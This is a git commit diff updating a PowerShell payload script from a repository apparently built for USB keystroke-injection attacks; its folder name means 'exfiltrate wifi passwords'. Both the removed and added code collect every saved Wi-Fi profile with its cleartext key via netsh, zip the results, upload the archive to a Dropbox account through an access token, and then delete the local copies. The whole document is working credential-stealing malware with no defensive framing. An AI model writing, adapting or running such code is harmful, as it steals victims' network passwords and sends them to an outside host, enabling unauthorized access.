fbfdff748341a1fda295c2ed2a389b74f387ab57
flippemen <99625153+dolaraso@users.noreply.github.com>
2024-07-16 13:59:23 -0500

    Update payload.ps1

--- exfiltrar contrasenas wifi/payload.ps1
+++ exfiltrar contrasenas wifi/payload.ps1
@@ -1,83 +1,24 @@
-# payload.ps1
-param (
-    [string]$dropboxToken
+param(
+    [string]$AccessToken
 )
 
-function Show-Header {
-    $header = @"
-########################################################################################################################
-#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           #
-#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                         #
-#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                           #
-#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                          #
-#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                         #
-#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          #
- #########################################################################################################################           
-"@
-    return $header
-}
+$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss');
+$userDir = (Get-Item env:\userprofile).Value + '\Documents\Networks_' + $folderDateTime;
+New-Item -Path $userDir -ItemType Directory;
+netsh wlan show profiles | Select-String ": " | % { $_.ToString().Split(":")[1].Trim() } | % {
+    netsh wlan show profile name=$_ key=clear | Out-File -FilePath ($userDir + '\' + $_ + '.txt')
+};
+Compress-Archive -Path $userDir -DestinationPath ($userDir + '.zip');
+Start-Sleep -s 5;
+Copy-Item -Path ($userDir + '.zip') -Destination 'C:\Users\Public\';
+Remove-Item -Path $userDir -Recurse;
 
-function DropBox-Upload {
-    param (
-        [string]$SourceFilePath
-    )
-    $outputFile = Split-Path $SourceFilePath -leaf
-    $TargetFilePath = "/$outputFile"
-    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $dropboxToken
-    $headers = @{
-        "Authorization" = $authorization
-        "Dropbox-API-Arg" = $arg
-        "Content-Type" = 'application/octet-stream'
-    }
-
-    # Añadir encabezado al contenido del archivo
-    $header = Show-Header
-    $fileContent = Get-Content -Path $SourceFilePath -Raw
-    $combinedContent = $header + "`r`n" + $fileContent
-    $tempFilePath = [System.IO.Path]::GetTempFileName()
-    Set-Content -Path $tempFilePath -Value $combinedContent
-
-    # Subir el archivo a Dropbox
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers
-
-    # Limpiar el archivo temporal
-    Remove-Item -Path $tempFilePath -Force
-}
-
-function Get-WifiPasswords {
-    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
-    $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
-    New-Item -Path $userDir -ItemType Directory -Force | Out-Null
-
-    $wifiProfiles = netsh wlan show profiles | Select-String ": " | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-    foreach ($profile in $wifiProfiles) {
-        $profileFilePath = "$userDir\$profile.txt"
-        netsh wlan show profile name=$profile key=clear | Out-File -FilePath $profileFilePath
-    }
-
-    $zipFilePath = "$userDir.zip"
-    Compress-Archive -Path $userDir -DestinationPath $zipFilePath -Force
-
-    Remove-Item -Path $userDir -Recurse -Force
-    return $zipFilePath
-}
-
-try {
-    # Obtener y comprimir las contraseñas WiFi
-    $zipFilePath = Get-WifiPasswords
-
-    # Subir a Dropbox si se proporciona el token
-    if (-not ([string]::IsNullOrEmpty($dropboxToken))) {
-        DropBox-Upload -SourceFilePath $zipFilePath
-    } else {
-        Write-Error "No se proporcionó el token de acceso de Dropbox."
-        exit
-    }
-
-    # Limpiar el archivo ZIP
-    Remove-Item -Path $zipFilePath -Force
-}
-catch {
-    Write-Error "An error occurred: $_"
-}
+$hookurl = "https://content.dropboxapi.com/2/files/upload";
+$file = "C:\Users\Public\" + ($userDir.Split('\')[-1]) + ".zip";
+$headers = @{
+    Authorization = "Bearer $AccessToken";
+    "Content-Type" = "application/octet-stream";
+    "Dropbox-API-Arg" = "{""path"": ""/Networks.zip"", ""mode"": ""add"", ""autorename"": true}"
+};
+Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -InFile $file;
+Remove-Item -Path $file;
